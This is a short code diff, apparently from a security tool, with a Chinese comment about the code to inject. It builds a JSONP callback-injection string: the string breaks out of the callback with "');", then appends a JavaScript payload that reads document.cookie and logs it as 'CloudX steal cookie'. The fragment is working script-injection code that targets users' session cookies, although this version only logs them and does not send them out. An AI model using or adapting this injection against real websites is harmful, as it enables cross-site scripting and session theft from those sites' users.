@@ -321,7 +321,7 @@
 
 
         // 要注入的代码（移除内部重复的 payload 声明）
-        const payload = "console.log('cloud:'+document.cookie);if (!location.href.startsWith(currUrl) && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}";
+        const payload = "console.log('cloud:'+document.cookie);if (!location.href.startsWith(\"${currUrl}\") && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}";
         // const base64Code = btoa(payload);
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
